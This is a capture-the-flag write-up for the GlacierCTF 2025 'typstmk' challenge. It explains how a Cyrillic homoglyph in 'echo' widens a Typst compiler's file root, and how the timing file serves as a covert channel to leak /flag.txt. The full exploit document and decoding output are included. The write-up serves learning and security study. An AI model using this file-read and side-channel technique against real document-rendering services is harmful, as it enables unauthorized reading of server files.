
typstmk - GlacierCTF 2025 Writeup

  The Challenge

  We're given a service that compiles https://typst.app/ documents (think: a modern alternative to LaTeX). The twist? It compiles your document twice for some reason, and there's a flag sitting
   at /flag.txt that we need to read.

  nc challs.glacierctf.com 13385

  First Look at the Code

  The main script is pretty straightforward - it takes your Typst document (base64 encoded), compiles it twice, and returns the PDF:

  typst compile --root "$(еcho ${TMPDIR:-/tmp} 2>/dev/null)/" --timings "./{n}.json" ./main.typ
  rm -rf ./main.pdf
  typst compile --root "$(echo ${TMPDIR:-/tmp} 2>/dev/null)/" --timings "./{n}.json" ./main.typ

  Wait... why compile twice? And why delete the PDF between compilations? That's suspicious.

  Spotting the Trick

  After staring at the code for a while, I noticed something weird. Look at these two lines again:

  typst compile --root "$(еcho ${TMPDIR:-/tmp} 2>/dev/null)/" ...  # Line 22
  typst compile --root "$(echo ${TMPDIR:-/tmp} 2>/dev/null)/" ...  # Line 24

  They look identical, right? Wrong.

  The first echo isn't actually echo - it's еcho with a Cyrillic 'е' (U+0435) instead of a regular ASCII 'e' (U+0065). This is called a homoglyph attack - using characters that look the same
  but aren't.

  Since еcho (with Cyrillic e) isn't a real command, it fails silently and returns nothing. So:

  - First compilation: --root "/" (empty string becomes root directory)
  - Second compilation: --root "/tmp/" (normal echo works fine)

  Why Does This Matter?

  The --root flag in Typst controls where absolute paths resolve to. So when we try to read /flag.txt:

  - First compilation (root = /): /flag.txt → actual /flag.txt ✅ Can read the flag!
  - Second compilation (root = /tmp/): /flag.txt → /tmp/flag.txt ❌ File doesn't exist

  But here's the problem: the first PDF gets deleted, and only the second compilation's output is returned to us. So we can read the flag in the first pass, but we can't see the output!

  The Persistence Problem

  We need to somehow pass information from the first compilation to the second. What persists between them?

  1. The PDF - Nope, deleted with rm -rf ./main.pdf
  2. Our source file - Can't modify it from within Typst
  3. The timing file - Wait, what's this?

  The --timings "./{n}.json" flag creates a JSON file with performance metrics. And crucially:
  - First compilation writes to 0.json
  - Second compilation can READ 0.json before overwriting it

  We have a communication channel!

  Understanding the Timing File

  The timing file looks something like this:

  [
    {"name":"func call","cat":"typst","ph":"B","ts":719.48,"args":{"file":"/tmp/main.typ","line":5}},
    {"name":"func call","cat":"typst","ph":"E","ts":736.75,"args":{"file":"/tmp/main.typ","line":5}},
    ...
  ]

  Every function call gets logged with its source location (file and line number). Each call creates two events: Begin (B) and End (E).

  The Encoding Scheme

  Here's the clever part. We can't control WHAT text goes into the timing file, but we can control HOW MANY events are created and WHERE they come from.

  The plan:
  1. Define functions at specific line numbers
  2. For each character of the flag, call the corresponding function ASCII_VALUE times
  3. The timing file records all these calls with their line numbers
  4. Second compilation counts events per line → recovers the flag

  For example, if the first character is 'g' (ASCII 103):
  - Call function f0 exactly 103 times
  - This creates 206 events (103 × 2) at line 8 (where f0 is defined)
  - Second pass sees "L8=206" → 206/2 = 103 → chr(103) = 'g'

  The Exploit

  #let timing_raw = read("0.json")

  #if timing_raw.len() == 0 [
    // First pass - timing file is empty
    #{
      let flag = read("/flag.txt")
      let chars = flag.clusters()

      // Functions defined at known line numbers
      let f0(x) = x + 1
      let f1(x) = x + 1
      let f2(x) = x + 1
      let f3(x) = x + 1
      let f4(x) = x + 1

      // Call each function based on character's ASCII value
      if chars.len() > 0 { for i in range(chars.at(0).to-unicode()) { let _ = f0(i) } }
      if chars.len() > 1 { for i in range(chars.at(1).to-unicode()) { let _ = f1(i) } }
      if chars.len() > 2 { for i in range(chars.at(2).to-unicode()) { let _ = f2(i) } }
      if chars.len() > 3 { for i in range(chars.at(3).to-unicode()) { let _ = f3(i) } }
      if chars.len() > 4 { for i in range(chars.at(4).to-unicode()) { let _ = f4(i) } }

      flag
    }
  ] else [
    // Second pass - decode from timing file
    #let events = json.decode(timing_raw)
    #let func_calls = events.filter(e => e.name == "func call")

    #{
      let line_counts = (:)
      for fc in func_calls {
        let line = str(fc.args.line)
        if line in line_counts {
          line_counts.at(line) = line_counts.at(line) + 1
        } else {
          line_counts.insert(line, 1)
        }
      }
      for (line, count) in line_counts {
        [L#line=#count ]
      }
    }
  ]

  Running It

  There was one catch - the timing file has a size limit. Encoding too many characters at once would exceed it and crash the second compilation. So I extracted the flag 5 characters at a time:

  Chars 0-4:   L8=206 L9=198 L10=232 L11=204 L12=246
               → 103,99,116,102,123 → "gctf{"

  Chars 5-9:   L8=194 L9=112 L10=110 L11=200 L12=204
               → 97,56,55,100,102 → "a87df"

  Chars 10-14: L8=190 L9=104 L10=220 L11=200 L12=190
               → 95,52,110,100,95 → "_4nd_"

  ... (continuing in batches)

  Chars 40-44: L8=112 L9=196 L10=106 L11=102 L12=250
               → 56,98,53,51,125 → "8b53}"

  The Flag

  gctf{a87df_4nd_st1ll_f4st3r_th4n_l4t3x_28b53}

  Or in human-readable form: "a87df and still faster than latex 28b53" - a reference to Typst being faster than LaTeX!

  TL;DR

  1. Spot the Cyrillic 'е' in еcho causing different --root paths between compilations
  2. First compilation can read /flag.txt, second cannot
  3. Use the timing file as a side-channel to pass data between compilations
  4. Encode each character as a count of function calls at specific line numbers
  5. Decode by counting events per line in the second pass

  The challenge was a neat combination of Unicode trickery and creative abuse of Typst's timing feature as a covert channel. Pretty clever!

